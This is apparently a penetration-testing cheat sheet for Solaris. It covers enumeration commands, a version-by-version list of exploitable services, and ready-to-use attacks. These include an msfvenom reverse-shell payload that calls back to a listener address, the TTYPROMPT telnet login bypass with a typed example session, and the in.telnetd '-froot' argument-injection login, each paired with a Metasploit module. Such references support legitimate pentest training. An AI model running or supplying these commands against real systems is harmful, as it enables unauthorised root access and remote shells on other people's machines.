---
description: Information gathering and exploitation
---

# Solaris

## Enumeration

**View patches** 

`showrev -p` 

**Installed packages:** 

`Pkginfo  OR pkginfo -x`

**Host information**

`uname -a`

**Show IP interface:** 

`Ifconfig -a` 

**Process list:** 

`/usr/ucb/ps -auxww` 

## Common Solaris Vulnerabilities

### Solaris 7

* sadmind\_exec SADMIND - weakness in default security settings - allows root - rootdown.pl 
* \*\*ttyprompt TELNET - buffer overflow in solaris login - manual through telnet client 
* sendmail\_exec LPD - line printer daemon buffer overflow - allows root 
* heap\_noir DTSPCD - CDE common desktop environment heap overflow TCP port 6112, runs with root 
* ypupdated\_exec YPUPDATED - weakness in handling of the command shell - allows root 
* kcms\_readfile kcms / ttdbserverd remote file read \(only in msf2\)

### Solaris 8

* sadmind\_exec SADMIND - weakness in default security settings - allows root - rootdown.pl 
* \*\*ttyprompt TELNET - buffer overflow in solaris login - manual through telnet client 
* sendmail\_exec LPD - line printer daemon buffer overflow - allows root 
* heap\_noir DTSPCD - CDE common desktop environment heap overflow TCP port 6112, runs with root 
* ypupdated\_exec YPUPDATED - weakness in handling of the command shell - allows root. 
* no exploit - sadmind\_adm\_build\_path SADMIND - stack buffer overflow in adm\_build\_path\(\) function. 
* kcms\_readfile kcms / ttdbserverd remote file read \(only in msf2\)

### solaris 9:

* sadmind\_exec SADMIND - weakness in default security settings - allows root - rootdown.pl 
* ypupdated\_exec YPUPDATED - weakness in handling of the command shell - allows root. 
* sadmind\_adm\_build\_path SADMIND - stack buffer overflow in adm\_build\_path\(\) function. 
* kcms\_readfile kcms / ttdbserverd remote file read \(only in msf2\)

### Solaris 10

* fuser TELNET - authentication bypass through -f command - can be manually exploited 
* ypupdated\_exec YPUPDATED - weakness in handling of the command shell - allows root.

### Solaris 11

* fuser TELNET - authentication bypass through -f command - can be manually exploited

## **Exploits**

### **Solaris 8 finger**

`finger '1 2 3 4 5 6 7 8 9 0'@target`

### **Solaris exploits**

https://github.com/0xdea/exploits 

### **Msfvenom payload** 

`msfvenom -p solaris/x86/shell_reverse_tcp lhost=10.10.14.6 lport=5555 -f elf > /root/Desktop/raj.elf`

###  TTYPROMPT exploit

Solaris TTYPROMPT Security Vulnerability \(Telnet\) 

This vulnerability is very simple to exploit, since it does not require any code to be compiled by an attacker. The vulnerability only requires the attacker to simply define the environment variable TTYPROMPT to a 6-character string, inside telnet. Jonathan believes this overflows an integer inside login, which specifies whether the user has been authenticated \(just a guess\). 

Once connected to the remote host, you must type the username, followed by 64 " c"s, and a literal "\n". You will then be logged in as the user without any password authentication. This should work with any account except root \(unless remote root login is allowed\).  

**Example**:

```text
coma% telnet  
telnet> environ define TTYPROMPT abcdef  
telnet> o localhost  
SunOS 5.8  
bin c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c\n  
Last login: whenever  
$ whoami bin  
```

**Metasploit:**

 Solaris in.telnetd TTYPROMPT Buffer Overflow

```text
msf > use exploit/solaris/telnet/ttyprompt
```

### **Telnet exploit \(fuser\)**

exploits the argument injection vulnerability in the telnet daemon \(in.telnetd\) of Solaris 10 and 11.  

**Command line:** 

```text
telnet -l "-fbin" target_address 
Or also 
telnet -l "-froot" 192.168.0.1 
```

**Metasploit:** 

msf &gt; use exploit/solaris/telnet/fuser 

